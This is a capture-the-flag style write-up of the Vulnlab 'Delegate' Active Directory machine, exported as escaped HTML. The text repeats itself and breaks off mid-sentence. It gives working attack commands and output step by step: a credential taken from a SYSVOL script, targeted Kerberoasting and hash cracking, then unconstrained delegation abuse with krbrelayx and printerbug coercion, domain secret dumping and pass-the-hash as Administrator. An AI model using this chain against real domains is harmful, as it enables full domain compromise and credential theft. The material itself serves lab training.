class=\"line\">smb: \\delegate.vl\\scripts\\&gt; get users.bat</span><br><span class=\"line\">getting file \\delegate.vl\\scripts\\users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)</span><br></pre></td></tr></table></figure>\n\n<p>I found an interesting <code>users.bat</code> file in the startup script folder in <code>SYSVOL</code>. Let’s pull this down to our local machine to see if it contains any information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat users.bat               </span><br><span class=\"line\">rem @echo off</span><br><span class=\"line\">net use * /delete /y</span><br><span class=\"line\">net use v: \\\\dc1\\development </span><br><span class=\"line\"></span><br><span class=\"line\">if %USERNAME%==A.Briggs net use h: \\\\fileserver\\backups /user:Administrator [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, it seems as though we have a user that is accessing a share in their startup script and accessing the backup share in the fileserver as an Administrator.</p>\n<p>Assuming that this password is associated with this user, let’s run crackmapexec to see if their password is a match.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.87.35 -u &#x27;A.Briggs&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [+] delegate.vl\\A.Briggs:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ crackmapexec ldap 10.10.87.35 -u &#x27;A.Briggs&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.87.35     389    DC1              [+] delegate.vl\\A.Briggs:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though this is a valid domain user, who has access to both LDAP and SMB. Since we have access to LDAP, we can dump the domain as this user to view all of the domain objects. Let’s use Bloodhound with the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a> to do this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;delegate.vl&#x27; -u &#x27;A.Briggs&#x27; -p &#x27;(A.BRIGGS PASSWORD)&#x27; -c all -ns 10.10.87.35 --zip</span><br></pre></td></tr></table></figure>\n\n<p>This should return a compressed archive containing all of the domain objects within the AD environment. We’ll start up <code>neo4j</code> along with the <code>Bloodhound</code> GUI in order to view this in a graph.</p>\n<h1 id=\"GenericWrite-over-N-Thompson\"><a href=\"#GenericWrite-over-N-Thompson\" class=\"headerlink\" title=\"GenericWrite over N.Thompson\"></a>GenericWrite over N.Thompson</h1><p>I did some initial enumeration of the domain objects, specifically the node for <code>A.Briggs</code> and what they have access to. It seems they have an interesting outbound object control on another node.</p>\n<p><img src=\"/images/vulnlab/delegate-vl/b.png\"></p>\n<p>From the screenshot above, it seems as though we have GenericWrite over the user <code>N.Thompson</code>.</p>\n<p>This is much different than what we know about having GenericWrite or GenericAll on a node in the past. For some of my other writeups, we often had these privileges on a domain computer. The process for exploiting this against a domain user is much different - though it is simpler in my opinion.</p>\n<p>If we have GenericWrite over a domain user object, there is a Kerberos exploit we could do. We could perform <a href=\"https://github.com/ShutdownRepo/targetedKerberoast\">targeted Kerberoasting</a> on the domain object to request a TGS on behalf of them. This TGT will be encrypted with their password, which we can attempt to crack offline.</p>\n<p>You can do this with the GitHub repository provided above. An example command can be found below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 targetedKerberoast.py -d &#x27;delegate.vl&#x27; -u &#x27;A.Briggs&#x27; -p &#x27;(A.BRIGGS PASSWORD)&#x27; --request-user &#x27;N.Thompson&#x27;</span><br><span class=\"line\">[*] Starting kerberoast attacks</span><br><span class=\"line\">[*] Attacking user (N.Thompson)</span><br><span class=\"line\">[+] Printing hash for (N.Thompson)</span><br><span class=\"line\">$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$99c33fd94eb13970a6963667b7589c0a$29314c913d36f[...snip...]88b9ec9b2f6cd7e7f190edb308d9f</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this returned a valid TGS for the <code>N.Thompson</code> user. I did not need to update any of the dependencies needed for this, though it may be different for you.</p>\n<p>Let’s now use <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat</a> with a hash-identifier of 13100 to attempt to decrypt this hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 13100 nthompson.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">f81d26ea14e743da90803146fc62ee86195ff78c872e0422bfb05fcb74c9ec6337b612aaa6338382da5ee166bffe0d275685ab7388b9ec9b2f6cd7e7f190edb308d9f:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, the password was cracked successfully. We can now use this with crackmapexec to see if <code>N.Thompson</code> has any valid authentication to any other resources.</p>\n<p><img src=\"/images/vulnlab/delegate-vl/c.png\"></p>\n<p>It seems as though <code>N.Thompson</code> is a part of the <code>Remote Management Users</code> group. From my first guess, this means that they can PSRemote into the machine (meaning they have RDP access).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.87.35     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class=\"line\">HTTP        10.10.87.35     5985   DC1              [*] http://10.10.87.35:5985/wsman</span><br><span class=\"line\">WINRM       10.10.87.35     5985   DC1              [+] delegate.vl\\N.Thompson:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we have the ability to WinRM into the machine. Let’s do so with <code>evil-winrm</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;(N.THOMPSON PASSWORD)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\"></span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"></span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; whoami</span><br><span class=\"line\">delegate\\n.thompson</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; hostname</span><br><span class=\"line\">DC1</span><br></pre></td></tr></table></figure>\n\n<p>The first user flag is within their home directory, denoted path as <code>C:\\Users\\N.Thompson\\Desktop\\user.txt</code>.</p>\n<h1 id=\"SeEnableDelegationPrivilege-and-MAQs\"><a href=\"#SeEnableDelegationPrivilege-and-MAQs\" class=\"headerlink\" title=\"SeEnableDelegationPrivilege and MAQs\"></a>SeEnableDelegationPrivilege and MAQs</h1><p>I decided not to use Sliver for this, as it really isn’t needed aside from transferring files to the machine easily. We’ll be doing the rest of this solely from the WinRM session that we have.</p>\n<p>If you run <code>whoami /priv</code>, you’ll notice an interesting privilege that has been enabled for <code>N.Thompson</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                                                    State</span><br><span class=\"line\">============================= ============================================================== =======</span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain                                     Enabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled</span><br><span class=\"line\">SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though they have <code>SeEnableDelegationPrivilege</code>, which is a new privilege that I have not encountered before. This specific privilege allows us to enable the trusted asset for computer and user accounts.</p>\n<p>You can find documentation on this privilege <a href=\"https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html\">here</a>. Essentially, this privilege allows our user to impersonate other accounts or computers. The interesting thing about this privilege is that we can essentially set delegation properties to be configured on behalf of user and computer objects, hence the ability for us to <code>Enable</code> delegation.</p>\n<p>Another interesting part about this is the fact that we can do this for computer accounts as well. While we don’t have access to any machine accounts currently, our current user does have a property that isn’t normally enabled to user accounts. That specific property is our MAQ, or <code>MachineAccountQuota</code>. This specific property allows us to create computer accounts within the context of our current users permissions.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;[...snip...]&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.87.35     389    DC1              [+] delegate.vl\\N.Thompson:[...snip...]</span><br><span class=\"line\">MAQ         10.10.87.35     389    DC1              [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.87.35     389    DC1              MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems as though <code>N.Thompson</code> has a MAQ of 10. In order to add computer accounts to the domain, a minimum MAQ of 1 is required.</p>\n<h1 id=\"Exploiting-Unconstrained-Delegation\"><a href=\"#Exploiting-Unconstrained-Delegation\" class=\"headerlink\" title=\"Exploiting Unconstrained Delegation\"></a>Exploiting Unconstrained Delegation</h1><p>At this point, the attack path becomes relatively clear. What we’ll need to do is perform <a href=\"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\">Unconstrained Delegation</a>:</p>\n<ul>\n<li>Create a computer account and add its DNS entry to <code>EXAMPLE.delegate.vl</code> to point to our attacker machine.</li>\n<li>Use <code>krbrelayx</code> to listen for incoming Kerberos keys and cache them accordingly.</li>\n<li>Coerce an authentication attempt from the DC and capture the authentication request with <code>krbrelayx</code>. (We can use <code>printerbug</code> for this)</li>\n<li>Use the captured DC service ticket to dump the domain secrets.</li>\n</ul>\n<p>I found reference on how to do this locally from our Kali machine <a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\">here</a>. While I had given it a try to use <code>addcomputer</code> in Impacket’s library to do this, the issue is that it does not add the sufficient SPNs that you need on the machine account to perform unconstrained delegation. The only SPN that you have the ability to add with <code>addcomputer</code> is <code>HTTP/(account).delegate.vl</code>.</p>\n<p>The list of the required SPNs is below. I used <a href=\"https://github.com/Kevin-Robertson/Powermad\">Powermad</a> to get the specific attributes of a machine account I had configured.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP/dazzad.delegate.vl</span><br><span class=\"line\">RestrictedKrbHost/dazzad</span><br><span class=\"line\">HOST/dazzad</span><br><span class=\"line\">RestrictedKrbHost/dazzad.delegate.vl</span><br><span class=\"line\">HOST/dazzad.delegate.vl</span><br></pre></td></tr></table></figure>\n\n<p>Luckily enough, when you add a machine account via Powermad, it should add these SPNs for you. There is also an additional SPN identifier that we’ll need to have to ensure that the delegation rights are set correctly on the account.</p>\n<p>Let’s first start by creating the computer account through WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; New-MachineAccount -MachineAccount dazzad -Password $(ConvertTo-SecureString &#x27;DazPassword123@&#x27; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>\n\n<p>Next, we’ll add the SPNs to the machine account so that it can properly exploit the delegation.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; Set-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Value HTTP/dazzad.delegate.vl -Append</span><br><span class=\"line\">[+] Machine account dazzad attribute ServicePrincipalName appended</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; Set-MachineAccountAttribute -MachineAccount dazzad -Attribute userAccountControl -Value 528384</span><br><span class=\"line\">[+] Machine account daz attribute userAccountControl updated</span><br></pre></td></tr></table></figure>\n\n<p>We can verify our changes to the machine account by running <code>Get-MachineAccountAttribute</code> against the machine account we created.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; Get-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Verbose</span><br><span class=\"line\">Verbose: [+] Domain Controller = DC1.delegate.vl</span><br><span class=\"line\">Verbose: [+] Domain = delegate.vl</span><br><span class=\"line\">Verbose: [+] Distinguished Name = CN=dazzad,CN=Computers,DC=delegate,DC=vl</span><br><span class=\"line\">HTTP/dazzad.delegate.vl</span><br><span class=\"line\">RestrictedKrbHost/dazzad</span><br><span class=\"line\">HOST/dazzad</span><br><span class=\"line\">RestrictedKrbHost/dazzad.delegate.vl</span><br><span class=\"line\">HOST/dazzad.delegate.vl</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the respective SPNs set for this exploit, we can move back to our Kali machine for the rest of the exploit.</p>\n<p>We’ll need to add the LDAP record to <code>delegate.vl</code> to ensure that when we force it to authenticate to our machine account, it will redirect back to our MITM <code>krbrelayx</code> handler.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/dnstool.py -u &#x27;delegate.vl\\dazzad$&#x27; -p &#x27;DazPassword123@&#x27; -r DAZZAD.delegate.vl -d (KALI IP) --action add -dns-ip 10.10.92.191 dc1.delegate.vl                        </span><br><span class=\"line\">[-] Connecting to host...</span><br><span class=\"line\">[-] Binding to host</span><br><span class=\"line\">[+] Bind OK</span><br><span class=\"line\">[-] Adding new record</span><br><span class=\"line\">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>\n\n<p>Now that all of that is set, we can start our <code>krbrelayx</code> listener to listen for incoming requests.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/krbrelayx.py --krbsalt &#x27;DELEGATE\\DAZ$&#x27; --krbpass &#x27;DazPassword123@&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then use <code>printerbug</code> to exploit the authentication coercion. This should force the DC to authenticate to our machine account, meaning the Kerberos TGT used to access our fake machine will be cached during the authentication exchange.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/printerbug.py delegate.vl/&#x27;DAZ$&#x27;:&#x27;DazPassword123@&#x27;@dc1.delegate.vl DAZZAD.delegate.vl</span><br><span class=\"line\">[*] Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl</span><br><span class=\"line\">[*] Bind OK</span><br><span class=\"line\">[*] Got handle</span><br><span class=\"line\">DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class=\"line\">[*] Triggered RPC backconnect, this may or may not have worked</span><br></pre></td></tr></table></figure>\n\n<p>While we do get an <code>access_denied</code> error, if you look back at our <code>krbrelayx</code> listener - it should have received the authentication attempt and cached the DC’s service ticket in a <code>.ccache</code> file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] Setting up DNS Server</span><br><span class=\"line\">[*] Servers started, waiting for connections</span><br><span class=\"line\">[*] SMBD: Received connection from 10.10.92.191</span><br><span class=\"line\">[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]</span><br><span class=\"line\">[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the service ticket for the DC, we can import this into our Kerberos authentication global variable to dump the respective secrets. I opted to rename the ticket file just so that the special characters don’t interfere with the global variable’s interpretation of the file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cp &#x27;DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache&#x27; dc.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ export KRB5CCNAME=dc.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We can now dump the secrets of the DC with our ticket using <code>secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump -k dc1.delegate.vl</span><br><span class=\"line\">......</span><br><span class=\"line\">[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user</span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>If you have done all of the required steps, you should have the NT hash for the Administrator user. We can now use this to login to DC via WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm 10.10.92.191 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.92.191    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class=\"line\">HTTP        10.10.92.191    5985   DC1              [*] http://10.10.92.191:5985/wsman</span><br><span class=\"line\">WINRM       10.10.92.191    5985   DC1              [+] delegate.vl\\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.92.191 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\"> </span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                        </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"></span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat ..\\Desktop\\root.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have read the root flag and have access via WinRM as the Administrator user, we have successfully completed this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine specifically was difficult (for priv esc) as it involved exploiting unconstrained delegation REMOTELY. I’ve only exploited unconstrained delegation between machines, to which one of them I had access as SYSTEM. This was something new to learn, and the <code>MachineAccountQuota</code> attribute is something that is definitely helpful as part of the exploit process.</p>\n<p>Big thanks to <code>geiseric</code> for creating this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/ShutdownRepo/targetedKerberoast\">https://github.com/ShutdownRepo/targetedKerberoast</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html\">https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html</a><br><a href=\"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a><br><a href=\"https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\">https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html</a><br><a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\">https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained</a><br><a href=\"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota\">https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota</a><br><a href=\"https://github.com/Kevin-Robertson/Powermad\">https://github.com/Kevin-Robertson/Powermad</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Delegate is another AD machine that focuses more on your knowledge of how to exploit user privileges and traverse through an AD environment. The bulk of this machine will be done through AD, harboring some exploits such as unconstrained delegation and GenericWrite privileges.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start by doing our usual NMAP scans of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.87.35</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 00:50 EDT</span><br><span class=\"line\">Nmap scan report for delegate.vl (10.10.87.35)</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As stated before in the introduction, this machine is strictly AD. This means we won’t need to enumerate any form of web server to gain access to a user list.</p>\n<p>Let’s run crackmapexec against the IP address to get the DNS name of the machine. Since this machine as ports 53 and 88, we can assume that it is a DC.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.87.35                                   </span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br></pre></td></tr></table></figure>\n\n<p>We’ll add the DNS name <code>dc1.delegate.vl</code> and <code>delegate.vl</code> to our <code>/etc/hosts</code> file.</p>\n<p>Let’s look at SMB to see if there are any files that are being hosted that we can exfil to our Kali machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.87.35 -N          </span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>\n\n<p>Since we have null authentication enabled to SMB, we can enumerate the shares without needing credentials. While the default shares seem to be the only shares on this machine, let’s still see if there’s anything within <code>NETLOGON</code> or <code>SYSVOL</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\delegate.vl\\scripts\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Aug 26 08:45:24 2023</span><br><span class=\"line\">  ..                                  D        0  Sat Aug 26 05:45:45 2023</span><br><span class=\"line\">  users.bat                           A      159  Sat Aug 26 08:54:29 2023</span><br><span class=\"line\"></span><br><span class=\"line\">5242879 blocks of size 4096. 1932408 blocks available</span><br><span class=\"line\">smb: \\delegate.vl\\scripts\\&gt; get users.bat</span><br><span class=\"line\">getting file \\delegate.vl\\scripts\\users.bat of size 159 as users.bat (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)</span><br></pre></td></tr></table></figure>\n\n<p>I found an interesting <code>users.bat</code> file in the startup script folder in <code>SYSVOL</code>. Let’s pull this down to our local machine to see if it contains any information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat users.bat               </span><br><span class=\"line\">rem @echo off</span><br><span class=\"line\">net use * /delete /y</span><br><span class=\"line\">net use v: \\\\dc1\\development </span><br><span class=\"line\"></span><br><span class=\"line\">if %USERNAME%==A.Briggs net use h: \\\\fileserver\\backups /user:Administrator [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, it seems as though we have a user that is accessing a share in their startup script and accessing the backup share in the fileserver as an Administrator.</p>\n<p>Assuming that this password is associated with this user, let’s run crackmapexec to see if their password is a match.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.87.35 -u &#x27;A.Briggs&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [+] delegate.vl\\A.Briggs:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ crackmapexec ldap 10.10.87.35 -u &#x27;A.Briggs&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.87.35     389    DC1              [+] delegate.vl\\A.Briggs:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though this is a valid domain user, who has access to both LDAP and SMB. Since we have access to LDAP, we can dump the domain as this user to view all of the domain objects. Let’s use Bloodhound with the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a> to do this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;delegate.vl&#x27; -u &#x27;A.Briggs&#x27; -p &#x27;(A.BRIGGS PASSWORD)&#x27; -c all -ns 10.10.87.35 --zip</span><br></pre></td></tr></table></figure>\n\n<p>This should return a compressed archive containing all of the domain objects within the AD environment. We’ll start up <code>neo4j</code> along with the <code>Bloodhound</code> GUI in order to view this in a graph.</p>\n<h1 id=\"GenericWrite-over-N-Thompson\"><a href=\"#GenericWrite-over-N-Thompson\" class=\"headerlink\" title=\"GenericWrite over N.Thompson\"></a>GenericWrite over N.Thompson</h1><p>I did some initial enumeration of the domain objects, specifically the node for <code>A.Briggs</code> and what they have access to. It seems they have an interesting outbound object control on another node.</p>\n<p><img src=\"/images/vulnlab/delegate-vl/b.png\"></p>\n<p>From the screenshot above, it seems as though we have GenericWrite over the user <code>N.Thompson</code>.</p>\n<p>This is much different than what we know about having GenericWrite or GenericAll on a node in the past. For some of my other writeups, we often had these privileges on a domain computer. The process for exploiting this against a domain user is much different - though it is simpler in my opinion.</p>\n<p>If we have GenericWrite over a domain user object, there is a Kerberos exploit we could do. We could perform <a href=\"https://github.com/ShutdownRepo/targetedKerberoast\">targeted Kerberoasting</a> on the domain object to request a TGS on behalf of them. This TGT will be encrypted with their password, which we can attempt to crack offline.</p>\n<p>You can do this with the GitHub repository provided above. An example command can be found below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 targetedKerberoast.py -d &#x27;delegate.vl&#x27; -u &#x27;A.Briggs&#x27; -p &#x27;(A.BRIGGS PASSWORD)&#x27; --request-user &#x27;N.Thompson&#x27;</span><br><span class=\"line\">[*] Starting kerberoast attacks</span><br><span class=\"line\">[*] Attacking user (N.Thompson)</span><br><span class=\"line\">[+] Printing hash for (N.Thompson)</span><br><span class=\"line\">$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$99c33fd94eb13970a6963667b7589c0a$29314c913d36f[...snip...]88b9ec9b2f6cd7e7f190edb308d9f</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this returned a valid TGS for the <code>N.Thompson</code> user. I did not need to update any of the dependencies needed for this, though it may be different for 